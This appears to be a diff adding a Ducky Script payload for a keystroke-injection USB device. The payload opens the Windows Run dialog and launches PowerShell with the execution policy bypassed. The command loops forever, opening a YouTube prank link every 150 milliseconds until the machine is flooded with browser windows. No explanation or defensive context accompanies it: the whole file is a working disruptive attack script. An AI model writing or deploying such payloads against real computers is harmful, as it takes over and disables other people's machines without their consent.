@@ -1,0 +1,5 @@
+DELAY 1500
+GUI r
+DELAY 400
+STRING powershell -NoP -Exec Bypass -C "$w=New-Object -ComObject wscript.shell; while($true){Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; Start-Sleep -m 150}"
+ENTER
